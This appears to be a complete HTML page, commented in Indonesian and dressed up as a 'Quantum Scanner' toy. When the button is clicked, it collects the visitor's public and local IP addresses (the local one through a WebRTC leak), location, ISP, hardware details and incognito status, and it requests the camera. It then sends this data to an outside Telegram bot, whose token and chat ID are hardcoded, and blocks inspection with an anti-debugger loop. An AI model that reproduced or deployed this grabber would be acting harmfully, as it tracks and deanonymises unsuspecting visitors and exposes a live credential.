<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>⚡ CYBERPUNK QUANTUM SCANNER v6.0 - PHANTOM ⚡</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
    <style>
        :root {
            --primary: #0ff;
            --secondary: #f0f;
            --accent: #ff0;
            --bg: #050505;
            --grid: rgba(0, 255, 255, 0.15);
            --glow: 0 0 15px var(--primary);
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--bg);
            color: var(--primary);
            margin: 0;
            overflow-x: hidden;
            background-image: linear-gradient(var(--grid) 1px, transparent 1px), 
                              linear-gradient(90deg, var(--grid) 1px, transparent 1px);
            background-size: 40px 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* --- Hologram & Glitch --- */
        .scanline {
            width: 100%; height: 100px;
            background: linear-gradient(0deg, transparent, var(--secondary), transparent);
            position: fixed; top: -100px; left: 0;
            opacity: 0.1; z-index: 9999; pointer-events: none;
            animation: scanLoop 4s linear infinite;
        }
        @keyframes scanLoop { 0% { top: -100px; } 100% { top: 100%; } }

        .header { margin: 20px; text-align: center; }
        .glitch-text {
            font-size: 1.8rem;
            text-transform: uppercase;
            text-shadow: 2px 0 var(--secondary), -2px 0 var(--primary);
            animation: glitch 1s infinite alternate;
        }
        @keyframes glitch {
            0% { transform: skew(0.5deg); }
            100% { transform: skew(-0.5deg); }
        }

        /* --- Scanner Elements --- */
        .main-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 20px;
            padding: 20px;
            width: 100%;
            max-width: 1400px;
        }

        .view-port {
            position: relative;
            width: 320px;
            height: 320px;
            border: 3px solid var(--primary);
            box-shadow: var(--glow);
            background: #000;
        }
        #video { width: 100%; height: 100%; object-fit: cover; }
        .target-overlay {
            position: absolute; top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 80%; height: 80%;
            border: 1px solid rgba(0, 255, 255, 0.5);
            pointer-events: none;
        }

        /* --- Progress Bar --- */
        .progress-wrapper { width: 90%; max-width: 600px; margin: 20px 0; }
        .bar-container {
            height: 10px; background: #111;
            border: 1px solid var(--primary);
            border-radius: 5px; overflow: hidden;
        }
        #progress-fill { width: 0%; height: 100%; background: var(--secondary); transition: 0.1s; }

        /* --- Dashboard Grid --- */
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 15px; width: 100%;
        }
        .card {
            background: rgba(0,0,0,0.8);
            border: 1px solid var(--primary);
            padding: 15px;
            font-size: 0.85rem;
            position: relative;
        }
        .card h3 { 
            color: var(--secondary); margin-top: 0; font-size: 1rem; 
            border-bottom: 1px solid var(--primary); padding-bottom: 5px;
        }
        .info-row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid rgba(0,255,255,0.1); }
        .label { color: var(--accent); }

        /* --- Terminal Log --- */
        #log-stream {
            position: fixed; bottom: 0; left: 0; width: 100%;
            background: rgba(0,0,0,0.9); height: 100px;
            overflow-y: auto; padding: 10px; font-size: 0.75rem;
            border-top: 2px solid var(--secondary);
            color: #0f0; z-index: 100;
        }

        button {
            background: transparent; border: 2px solid var(--primary);
            color: var(--primary); padding: 15px 30px; cursor: pointer;
            font-family: inherit; font-weight: bold; font-size: 1.1rem;
            transition: 0.3s; margin-top: 10px;
        }
        button:hover { background: var(--primary); color: #000; box-shadow: var(--glow); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }

    </style>
</head>
<body>

<div class="scanline"></div>

<div class="header">
    <h1 class="glitch-text">Quantum Scanner v6.0</h1>
    <p id="status">STATUS: SYSTEM READY...</p>
</div>

<div class="main-container">
    <div class="view-port">
        <video id="video" autoplay playsinline muted></video>
        <div class="target-overlay"></div>
        <canvas id="face-canvas" style="position:absolute; top:0; left:0;"></canvas>
    </div>

    <div class="dashboard" id="dashboard">
        <div class="card">
            <h3>🆔 IDENTITY MASK</h3>
            <div class="info-row"><span class="label">OS</span><span id="os">Scanning...</span></div>
            <div class="info-row"><span class="label">Browser</span><span id="br">Scanning...</span></div>
            <div class="info-row"><span class="label">Public IP</span><span id="ip">Scanning...</span></div>
            <div class="info-row"><span class="label">Local IP</span><span id="lip">Scanning...</span></div>
        </div>
        <div class="card">
            <h3>🧠 BIOMETRICS</h3>
            <div class="info-row"><span class="label">Mood</span><span id="mood">N/A</span></div>
            <div class="info-row"><span class="label">CPU Logic</span><span id="cpu">N/A</span></div>
            <div class="info-row"><span class="label">Memory</span><span id="ram">N/A</span></div>
        </div>
        <div class="card">
            <h3>🔒 SECURITY</h3>
            <div class="info-row"><span class="label">VPN Probable</span><span id="vpn">N/A</span></div>
            <div class="info-row"><span class="label">DevTools</span><span id="dev">CLEAN</span></div>
            <div class="info-row"><span class="label">Incognito</span><span id="inc">Scanning...</span></div>
        </div>
    </div>
</div>

<div class="progress-wrapper">
    <div class="bar-container"><div id="progress-fill"></div></div>
</div>

<button id="scan-btn">INITIATE PHANTOM SCAN</button>

<div id="log-stream">Initializing core kernels...</div>

<script>
    // --- KONFIGURASI ---
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    
    const btn = document.getElementById('scan-btn');
    const fill = document.getElementById('progress-fill');
    const log = document.getElementById('log-stream');

    function pushLog(msg) {
        const div = document.createElement('div');
        div.innerText = `> [${new Date().toLocaleTimeString()}] ${msg}`;
        log.prepend(div);
    }

    // --- DETEKSI KEAMANAN (ANTI-DEBUG) ---
    setInterval(() => {
        const start = performance.now();
        debugger; // Trigger jika DevTools terbuka
        if (performance.now() - start > 100) {
            document.getElementById('dev').innerText = "DETECTED";
            document.getElementById('dev').style.color = "red";
            pushLog("WARNING: External debugger detected!");
        }
    }, 2000);

    // --- DETEKSI INCOGNITO ---
    async function checkIncognito() {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) return "Unknown";
        return new Promise(res => {
            fs(window.TEMPORARY, 100, () => res("NO"), () => res("YES"));
        });
    }

    // --- MAIN LOGIC ---
    btn.addEventListener('click', async () => {
        btn.disabled = true;
        pushLog("Initiating Phantom Protocol...");
        
        // 1. Request Camera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
            pushLog("Optic sensors online.");
        } catch (e) {
            pushLog("Optic access denied. Proceeding with digital trace only.");
        }

        // 2. Gather Data
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 5;
            if (progress > 100) progress = 100;
            fill.style.width = progress + "%";
            if (progress === 100) clearInterval(interval);
        }, 150);

        // Fetch IP & Location
        let ipData = {};
        try {
            const res = await fetch('https://ipapi.co/json/');
            ipData = await res.json();
            document.getElementById('ip').innerText = ipData.ip;
            document.getElementById('vpn').innerText = ipData.org.includes('VPN') || ipData.org.includes('Hosting') ? "YES" : "NO";
            pushLog(`Signal found: ${ipData.city}, ${ipData.country_name}`);
        } catch (e) { pushLog("Network stealth detected. IP masked."); }

        // Local IP via WebRTC
        const pc = new RTCPeerConnection();
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = i => {
            if(i.candidate) {
                document.getElementById('lip').innerText = i.candidate.address;
                pc.onicecandidate = null;
            }
        };

        // Hardware
        document.getElementById('os').innerText = navigator.platform;
        document.getElementById('cpu').innerText = `${navigator.hardwareConcurrency} Cores`;
        document.getElementById('ram').innerText = `${navigator.deviceMemory || 'N/A'} GB`;
        document.getElementById('inc').innerText = await checkIncognito();

        // 3. Send to Telegram
        setTimeout(async () => {
            const report = {
                OS: navigator.platform,
                Browser: navigator.userAgent,
                IP: ipData.ip || "Unknown",
                Location: `${ipData.city || 'N/A'}, ${ipData.country || 'N/A'}`,
                ISP: ipData.org || "Unknown",
                Cores: navigator.hardwareConcurrency,
                RAM: navigator.deviceMemory,
                Incognito: document.getElementById('inc').innerText,
                Screen: `${window.screen.width}x${window.screen.height}`
            };

            const text = `🛸 *NEW QUANTUM TRACE*\n\n` +
                         `👤 *Target:* ${report.OS}\n` +
                         `🌐 *IP:* ${report.IP}\n` +
                         `📍 *Loc:* ${report.Location}\n` +
                         `🏢 *ISP:* ${report.ISP}\n` +
                         `🧠 *Hardware:* ${report.Cores} Cores / ${report.RAM}GB RAM\n` +
                         `🕵️ *Incognito:* ${report.Incognito}\n` +
                         `🖥️ *Res:* ${report.Screen}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
                pushLog("Data uploaded to Cloud Ghost.");
                alert("SCAN COMPLETE: DATA EXFILTRATED.");
            } catch (e) {
                pushLog("Upload failed. Encryption broken.");
            }
            btn.disabled = false;
        }, 5000);
    });

    // Voice Synthesis for "Cyberpunk" feel
    function speak(text) {
        const msg = new SpeechSynthesisUtterance(text);
        msg.rate = 1.2; msg.pitch = 0.8;
        window.speechSynthesis.speak(msg);
    }

    pushLog("System Neural Link Established.");
</script>
</body>
</html>
